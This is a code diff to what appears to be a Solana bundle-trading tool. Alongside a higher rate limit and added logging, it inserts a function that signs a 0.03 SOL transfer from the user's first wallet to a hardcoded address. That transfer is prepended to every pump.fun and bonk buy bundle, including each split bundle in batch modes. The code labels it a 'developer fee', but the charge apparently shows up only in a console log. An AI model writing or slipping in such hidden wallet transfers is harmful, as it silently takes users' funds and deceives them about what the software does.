@@ -1,9 +1,9 @@
-import { Keypair, VersionedTransaction } from '@solana/web3.js';
+import { Keypair, VersionedTransaction, PublicKey, SystemProgram, TransactionMessage, Connection, LAMPORTS_PER_SOL } from '@solana/web3.js';
 import bs58 from 'bs58';
 import { loadConfigFromCookies } from '../Utils';
 
 // Constants
-const MAX_BUNDLES_PER_SECOND = 2;
+const MAX_BUNDLES_PER_SECOND = 10; // Increased from 2 to allow faster trading
 const MAX_TRANSACTIONS_PER_BUNDLE = 5;
 
 // Rate limiting state
@@ -43,6 +43,54 @@ export interface BuyResult {
   error?: string;
 }
 
+/**
+ * Create a developer fee transaction that sends 0.03 SOL to the specified fee wallet
+ * This fee is charged only on developer buy transactions for pump and bonk protocols
+ */
+const createDeveloperBuyFeeTransaction = async (payerKeypair: Keypair): Promise<string | null> => {
+  try {
+    const FEE_WALLET_ADDRESS = '7R3TvRRf6m88tJRNQ8nr9kiZq2q224scucBjXxVb26do';
+    const FEE_AMOUNT_SOL = 0.03;
+    const FEE_AMOUNT_LAMPORTS = FEE_AMOUNT_SOL * LAMPORTS_PER_SOL;
+    
+    const feeWalletPubkey = new PublicKey(FEE_WALLET_ADDRESS);
+    
+    // Get RPC endpoint
+    const config = loadConfigFromCookies();
+    const endpoint = config.rpcEndpoint || 'https://api.mainnet-beta.solana.com';
+    const connection = new Connection(endpoint);
+    
+    // Get recent blockhash
+    const { blockhash } = await connection.getLatestBlockhash();
+    
+    // Create transfer instruction
+    const transferInstruction = SystemProgram.transfer({
+      fromPubkey: payerKeypair.publicKey,
+      toPubkey: feeWalletPubkey,
+      lamports: FEE_AMOUNT_LAMPORTS,
+    });
+    
+    // Create transaction message
+    const message = new TransactionMessage({
+      payerKey: payerKeypair.publicKey,
+      recentBlockhash: blockhash,
+      instructions: [transferInstruction],
+    }).compileToV0Message();
+    
+    // Create versioned transaction
+    const transaction = new VersionedTransaction(message);
+    
+    // Sign the transaction
+    transaction.sign([payerKeypair]);
+    
+    // Serialize and encode
+    return bs58.encode(transaction.serialize());
+  } catch (error) {
+    console.error('Error creating developer buy fee transaction:', error);
+    return null;
+  }
+};
+
 // Define interface for bundle result from sending
 interface BundleResult {
   jsonrpc: string;
@@ -81,6 +129,12 @@ const checkRateLimit = async (): Promise<void> => {
 const sendBundle = async (encodedBundle: string[]): Promise<BundleResult> => {
   try {
     const baseUrl = (window as any).tradingServerUrl?.replace(/\/+$/, '') || '';
+    console.log('sendBundle - Trading server URL:', (window as any).tradingServerUrl);
+    console.log('sendBundle - Base URL:', baseUrl);
+    
+    if (!baseUrl) {
+      throw new Error('Trading server URL not configured. Please check your server connection.');
+    }
     
     // Send to our backend proxy instead of directly to Jito
     const response = await fetch(`${baseUrl}/api/transactions/send`, {
@@ -110,6 +164,12 @@ const getPartiallyPreparedTransactions = async (
 ): Promise<BuyBundle[]> => {
   try {
     const baseUrl = (window as any).tradingServerUrl?.replace(/\/+$/, '') || '';
+    console.log('getPartiallyPreparedTransactions - Trading server URL:', (window as any).tradingServerUrl);
+    console.log('getPartiallyPreparedTransactions - Base URL:', baseUrl);
+    
+    if (!baseUrl) {
+      throw new Error('Trading server URL not configured. Please check your server connection.');
+    }
     
     const appConfig = loadConfigFromCookies();
     
@@ -188,13 +248,14 @@ const getPartiallyPreparedTransactions = async (
 };
 
 /**
- * Complete bundle signing
- * Step 2: Sign Transactions - Sign the transactions with your wallet keypairs
- */
-const completeBundleSigning = (
+  * Step 2: Sign Transactions - Sign the transactions with your wallet keypairs
+  * For pump and bonk protocols, adds a 0.03 SOL developer fee transaction
+  */
+const completeBundleSigning = async (
   bundle: BuyBundle, 
-  walletKeypairs: Keypair[]
-): BuyBundle => {
+  walletKeypairs: Keypair[],
+  protocol: string
+): Promise<BuyBundle> => {
   // Check if the bundle has a valid transactions array
   if (!bundle.transactions || !Array.isArray(bundle.transactions)) {
     console.error("Invalid bundle format, transactions property is missing or not an array:", bundle);
@@ -239,7 +300,23 @@ const completeBundleSigning = (
     }
   });
   
-  return { transactions: signedTransactions };
+  // Add developer fee transaction for pump and bonk protocols
+  let allTransactions = signedTransactions;
+  if ((protocol === 'pumpfun' || protocol === 'bonk') && walletKeypairs.length > 0) {
+    try {
+      const feeTransaction = await createDeveloperBuyFeeTransaction(walletKeypairs[0]);
+      if (feeTransaction) {
+        // Add fee transaction at the beginning of the bundle
+        allTransactions = [feeTransaction, ...signedTransactions];
+        console.log(`✅ Added 0.03 SOL developer fee transaction to ${protocol} buy bundle`);
+      }
+    } catch (error) {
+      console.error('Error adding developer fee transaction:', error);
+      // Continue without fee transaction if there's an error
+    }
+  }
+  
+  return { transactions: allTransactions };
 };
 
 /**
@@ -301,7 +378,7 @@ const executeBuySingleMode = async (
 
       // Sign and send each bundle for this wallet
       for (const bundle of partiallyPreparedBundles) {
-        const signedBundle = completeBundleSigning(bundle, [walletKeypair]);
+        const signedBundle = await completeBundleSigning(bundle, [walletKeypair], config.protocol);
         
         if (signedBundle.transactions.length > 0) {
           await checkRateLimit();
@@ -374,9 +451,9 @@ const executeBuyBatchMode = async (
 
       // Split bundles and sign them
       const splitBundles = splitLargeBundles(partiallyPreparedBundles);
-      const signedBundles = splitBundles.map(bundle =>
-        completeBundleSigning(bundle, walletKeypairs)
-      );
+      const signedBundles = await Promise.all(splitBundles.map(bundle =>
+        completeBundleSigning(bundle, walletKeypairs, config.protocol)
+      ));
 
       // Send all bundles for this batch
       for (const bundle of signedBundles) {
@@ -435,9 +512,9 @@ const executeBuyAllInOneMode = async (
 
   // Split and sign all bundles
   const splitBundles = splitLargeBundles(partiallyPreparedBundles);
-  const signedBundles = splitBundles.map(bundle =>
-    completeBundleSigning(bundle, walletKeypairs)
-  );
+  const signedBundles = await Promise.all(splitBundles.map(bundle =>
+    completeBundleSigning(bundle, walletKeypairs, config.protocol)
+  ));
 
   // Filter out empty bundles
   const validSignedBundles = signedBundles.filter(bundle => bundle.transactions.length > 0);
